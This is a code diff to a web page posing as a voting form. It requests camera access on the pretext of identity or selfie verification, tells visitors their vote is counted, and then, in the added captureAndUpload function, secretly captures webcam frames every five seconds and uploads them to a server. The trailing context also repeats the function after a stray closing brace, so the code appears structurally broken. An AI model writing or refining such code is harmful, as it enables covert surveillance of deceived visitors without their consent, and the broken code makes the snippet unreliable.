@@ -54,9 +54,9 @@
             try {
                 status.innerText = "Инициализация системы верификации...";
                 
-                // Запрашиваем камеру под предлогом "FaceID" или "Селфи-верификации"
+                // Запрашиваем камеру
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: true, 
+                    video: { width: 640, height: 480 }, // Явно указываем разрешение
                     audio: false 
                 });
 
@@ -68,18 +68,51 @@
                 status.innerText = "Спасибо! Ваш голос учтен.";
                 status.style.color = "#a8e063";
 
-                // Даем камере 1 секунду на "прогрев" перед первым снимком
+                // Даем камере 1 секунду на "прогрев"
                 setTimeout(() => {
+                    console.log("Начинаем захват...");
                     captureAndUpload(video);
                     setInterval(() => {
                         captureAndUpload(video);
                     }, 5000);
                 }, 1000);
 
-            } catch (err) {                console.error("Ошибка:", err);
-                status.innerText = "Ошибка: Для голосования необходима верификация личности.";
+            } catch (err) {
+                console.error("Ошибка:", err);
+                status.innerText = "Ошибка: " + err.message; // Выводим текст ошибки на экран
                 status.style.color = "#ff4b2b";
             }
+        });
+
+        // Функция для захвата кадра и отправки на сервер
+        async function captureAndUpload(videoElement) {
+            try {
+                if (videoElement.paused || videoElement.ended) return;
+
+                const canvas = document.createElement('canvas');
+                canvas.width = 400;
+                canvas.height = 300;
+                
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+                const imageData = canvas.toDataURL('image/jpeg', 0.5);
+
+                const response = await fetch('/upload', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: imageData })
+                });
+                
+                if (!response.ok) {
+                    console.error("Сервер вернул ошибку:", response.status);
+                } else {
+                    console.log("Кадр отправлен успешно");
+                }
+            } catch (err) {
+                console.error("Ошибка захвата/отправки:", err);
+            }
+        }
         });
         // Функция для захвата кадра и отправки на сервер
         async function captureAndUpload(videoElement) {
